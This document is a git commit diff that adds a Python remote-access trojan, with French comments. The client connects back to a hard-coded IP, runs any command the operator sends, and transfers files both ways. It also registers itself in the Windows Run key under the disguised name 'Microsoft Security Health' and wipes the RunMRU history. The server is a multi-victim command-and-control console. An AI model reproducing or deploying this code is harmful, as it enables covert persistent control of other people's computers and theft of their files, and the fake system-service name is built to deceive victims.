6632d0ac38b36234bebad9da281a54cca021363f
coni <deknicolas1911@gmail.com>
2020-10-07 00:16:07 +0200

    update..

--- client.py
+++ client.py
@@ -1,74 +1,130 @@
-import socket, os, subprocess, time
+import socket, os, subprocess, time, sys
 
 hote = "172.20.31.16"
-port = 25565
-clearconsole = "cls"
-nothing = " ".encode()
+port = 12800
 
-def connect():
-    #Boucle de connection si jamais le server n'est pas ouvert
-    connection = True
-    while connection is True:
-        try:
-            connectionToServer.connect((hote, port))
-            connection = False
-        except ConnectionRefusedError:
-            time.sleep(3)
+def connxion(hote,port):
+    connect_to_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        connect_to_server.connect((hote, port))
+    except ConnectionRefusedError:
+        return 1
+    
+    print("Connexion établie avec le serveur sur le port {}".format(port))
 
-            
-
-    #Boucle principal apres que la connection ait été faite
-    Clientboucle = True
-    while Clientboucle is True:
-
-        #envoie le path actuel
-        jesuisou = os.getcwd()+">"
-        jesuisou = jesuisou.encode()
-        try:
-            connectionToServer.send(jesuisou)
-
-        #Try si jamais le serveur quitte de force
-        except OSError:
-            #Il va essayer de se reconnecter au server
-            connectionToServer.close()
-            break
+    target_job = "void"
+    while True:
 
         try:
-            commande = connectionToServer.recv(99).decode()
-            #Fix de certaine commande qui ne fonctionne pas de base
-            if commande != "closeserverclient":
-                stderr = b''
-                stdout = b''
-                
-                if 'cd' in commande:
-                    derniereLettre = commande[-1]
-                    directory = commande[3:-1]+derniereLettre
-                    try:
-                        os.chdir(directory)
-                    except FileNotFoundError:
-                        stdout = b"Le dossier/fichier n'existe pas"
-                elif clearconsole == commande:
-                     connectionToServer.send(nothing)
-                elif "" == commande:
-                    connectionToServer.send(nothing)
-                else:
-                    commande = commande.encode()
-                    spl = subprocess.Popen(str(commande, "utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                    stdout, stderr = spl.communicate()
-                if stdout == b'':
-                    try:
-                        connectionToServer.send(stderr)
-                    except ConnectionAbortedError:
-                        break
-                if stderr == b'':
-                    connectionToServer.send(stdout)
-                if stdout == b'' and stderr == b'':
-                    connectionToServer.send(nothing) 
+            msg_recu = connect_to_server.recv(1024)
         
-        #Si le server quitte de force
+        
+            msg_arg = msg_recu.decode().split(" ")
+
+            if target_job == "void":
+                if msg_arg[0] == "tlakoya":
+                    connect_to_server.send("jsuislakoya".encode())
+
+                elif msg_arg[0] == "send":
+                    print(" ".join(msg_arg))
+                    try:
+                        connect_to_server.send("receivedthesendperfectly".encode())
+                    except:
+                        connect_to_server.close()
+                        return 1
+
+                elif msg_arg[0] == "remote_terminal":
+                    target_job = "remote_terminal"
+
+                elif msg_arg[0] == "close_server_client":
+                    connect_to_server.close()
+                    break
+
+            elif target_job == "remote_terminal":
+
+                if msg_arg[0] == "close_remote_terminal":
+                    target_job = "void"
+
+                elif msg_arg[0] == "download_from_server":
+
+                    print("telechargement de :",msg_arg[2])
+                    downloading_file = open(msg_arg[2],"wb")
+        
+                    downloading_file_bytes = connect_to_server.recv(int(msg_arg[1]))
+                    downloading_file.write(downloading_file_bytes)
+
+                    downloading_file.close()
+                    connect_to_server.send(b"ok")
+
+
+                elif msg_arg[0] == "download_from_target":
+                    if len(msg_arg) > 1:
+                        try:
+                            le_fichier = open(msg_arg[1],"rb")
+                            le_fichier_size = len(le_fichier.read())
+                            connect_to_server.send(msg_arg[0].encode()+b" "+str(le_fichier_size).encode()+b" "+msg_arg[1].encode())
+
+                            le_fichier.seek(0)
+                            le_fichier_bytes = le_fichier.read(le_fichier_size)
+                            connect_to_server.send(le_fichier_bytes)
+
+                        except FileNotFoundError:
+                            connect_to_server.send(b"file not found")
+
+
+                else:
+                    stderr = b''
+                    stdout = b''
+                    
+                    if msg_arg[0] == 'cd':
+                        directory = " ".join(msg_arg[1:])
+                        try:
+                            os.chdir(directory)
+                        except FileNotFoundError:
+                            stderr = b"Le dossier/fichier n'existe pas"
+                    
+                    elif "".join(msg_arg) == "":
+                        stdout = b" "
+
+                    else:
+                        commande = " ".join(msg_arg).encode()
+                        spl = subprocess.Popen(str(commande, "utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                        stdout, stderr = spl.communicate()
+
+                    if stdout == b'' and stderr == b'':
+                        command = b" " 
+                    elif stdout == b'' and stderr != b'':
+                        command = stderr
+                    elif stderr == b'' and stdout != b'':
+                        command = stdout
+
+                    connect_to_server.send(command)
+                    
+        except ConnectionAbortedError:
+            connect_to_server.close()
+            return 1
         except ConnectionResetError:
-            connectionToServer.close()
+            connect_to_server.close()
+            return 1
+    
+
+    return 0
+
+def auto_setup_whetever_you_are():
+    path_file = os.getcwd()+"\\"+sys.argv[0]
+    if "\\" in sys.argv[0]:
+        path_file = sys.argv[0]
+
+    commande = []
+    commande.append('reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v "Microsoft Security Health" /t REG_SZ /d "' + path_file + '"')
+    commande.append('reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f')
+    while commande:
+        subprocess.Popen(commande.pop(0), shell=True)
+    
+
+auto_setup_whetever_you_are()
 
 while True:
-    connectionToServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    connect()
+    connxion(hote,port)
+    print("reco dans 5 secondes")
+    time.sleep(5)
--- server.py
+++ server.py
@@ -1,36 +1,171 @@
-import socket, os
+import socket, select, time
+
 hote = ''
-port = 25565
-boucle = True
-clearconsole = "cls"
-socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-socket.bind((hote, port))
-socket.listen(1)
-print("Attente de connection")
+port = 12800
 
-client, infos_connexion = socket.accept()
-os.system(clearconsole)
-print("Connecté à : ",infos_connexion)
-print("\nRemote Terminal [Version 1]\n(c) 2019 Coni. J ai mis aucun droit lol.\n")
+def refresh_user(main_connexion):
+    clients_connectes = []
+    connexions_demandees, wlist, xlist = select.select([main_connexion],
+        [], [], 0.05)
 
-while boucle is True:
-    whereiam = client.recv(1024).decode()
-    commande = input(whereiam)
+    for connexion in connexions_demandees:
+        connexion_avec_client, infos_connexion = connexion.accept()
+        clients_connectes.append(connexion_avec_client)
+    
+    return clients_connectes
 
-    if commande == "closeserverclient":
-        boucle = False
-    elif commande == clearconsole:
-        os.system(clearconsole)
-    elif commande == "":
-        commande = " "
-    elif commande == "infoconnect":
-        print(infos_connexion)
-        commande = " "
-    commande = commande.encode()
-    client.send(commande)
-    reponse = str( client.recv(9999).decode("utf-8", errors="ignore"))
-    print(reponse)
-        
+def set_server():
+    return "server", None, "void"
 
-client.close()
-socket.close()
+
+connexion_principale = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connexion_principale.bind((hote, port))
+connexion_principale.listen(5)
+print("Le serveur écoute à présent sur le port {}".format(port))
+
+
+target, target_socket, target_job = set_server()
+clients_connectes = refresh_user(connexion_principale)
+
+while True:
+
+    try:
+        server_input = input(target+"@"+target_job+"# ")
+    except KeyboardInterrupt:
+        if target_job == "void":
+            server_input = "close_server_client"
+        if target_job == "remote_terminal":
+            server_input = "close_remote_terminal"
+    
+    server_action = server_input.split(" ")
+
+    if target_job == "void":
+        if server_action[0] == "refresh":
+            # Actualise la liste d'utilisateur connecte en virant ceux qui repondent pas à un "ping"
+            to_kick = []
+            nouveau_clients = refresh_user(connexion_principale)
+            clients_connectes += nouveau_clients
+            if clients_connectes:
+                for i in range(len(clients_connectes)):
+                    try:
+                        clients_connectes[i].send(b'tlakoya')
+                        jsuislakoya = clients_connectes[i].recv(1024)
+                    except ConnectionResetError:
+                        jsuislakoya = b""
+                    except ConnectionAbortedError:
+                        jsuislakoya = b""
+
+                    if jsuislakoya.decode() == "":
+                        to_kick.append(i)
+                    else:
+                        print(clients_connectes[i].getpeername()[0]+"\n")
+            else:
+                print("personne est connecte\n")
+
+            # kick les utilisateurs (ouai ils sont dans une liste mdr)
+            for i in to_kick:
+                clients_connectes.pop(i)
+
+        # focus sur un client en particulier
+        elif server_action[0] == "target":
+            is_client = False
+            if len(server_action) > 1:
+                if server_action[1] == "server":
+                    target, target_socket, target_job = set_server()
+
+                    is_client = True
+                elif server_action[1] != "":
+                    if clients_connectes:
+                        for i in range(len(clients_connectes)):
+                            if server_action[1] == clients_connectes[i].getpeername()[0]:
+                                target = server_action[1]
+                                target_socket = clients_connectes[i]
+                                target_job = "void"
+
+                                is_client = True
+                
+                if is_client == False:
+                    print("Le client",server_action[1],"est introuvable\n")
+            else:
+                print("vous n'avez pas entrez d'adresse\n")
+
+        # envoies un message aux clients (c'est plus pour l'experimentation et la phase "beta")
+        elif server_action[0] == "send":
+            if target_socket is not None:
+                target_socket.send(" ".join(server_action).encode())
+                verification = target_socket.recv(1024)
+                if verification.decode() == "":
+                    print("le client est deco\n")
+                    target, target_socket, target_job = set_server()
+            else:
+                print("target none\n")
+
+        elif server_action[0] == "remote_terminal":
+            target_job = "remote_terminal"
+            target_socket.send(b"remote_terminal")
+
+        elif server_action[0] == "close_server_client":
+            for iencli in clients_connectes:
+                iencli.send(b"close_server_client")
+            break
+
+    elif target_job == "remote_terminal":
+        try:
+            # focus sur le terminal d'une adresse en particulier
+            if server_action[0] == "close_remote_terminal":
+                target_job = "void"
+                target_socket.send(b"close_remote_terminal")
+
+            elif server_action[0] == "download_from_server":
+                if len(server_action) > 1:
+                    try:
+                        le_fichier = open(server_action[1],"rb")
+                        le_fichier_size = len(le_fichier.read())
+                        target_socket.send(server_action[0].encode()+b" "+str(le_fichier_size).encode()+b" "+server_action[1].encode())
+
+                        le_fichier.seek(0)
+                        le_fichier_bytes = le_fichier.read(le_fichier_size)
+                        target_socket.send(le_fichier_bytes)
+                        print(target_socket.recv(100).decode()+"\n")
+
+                    except FileNotFoundError:
+                        print("Le fichier n'existe pas\n")
+                else:
+                    print("vous n'avez tapez aucun nom de fichier\n")
+
+            elif server_action[0] == "download_from_target":
+                target_socket.send(server_input.encode())
+
+                if len(server_action) > 1:
+                    verification = target_socket.recv(1024)
+                    if verification.decode() != "file not found":
+                        verification = verification.decode().split(" ")
+
+                        downloading_file = open(verification[2],"wb")
+                        downloading_file_bytes = target_socket.recv(int(verification[1]))
+                        downloading_file.write(downloading_file_bytes)
+
+                        downloading_file.close()
+                        print("ok.\n")
+                    else:
+                        print(verification.decode()+"\n")
+                else:
+                    print("vous n'avez pas entrez de fichier")
+
+
+            else:
+                if server_input == "":
+                    server_input = " "
+
+                commande = server_input.encode()
+                target_socket.send(commande)
+                reponse = str(target_socket.recv(20000).decode("utf-8", errors="ignore"))
+                if reponse == "":
+                    print("le client est deco\n")
+                    target, target_socket, target_job = set_server()
+                else:
+                    print(reponse)
+                    
+        except ConnectionResetError:
+            print("le client a deco\n")
+            target, target_socket, target_job = set_server()
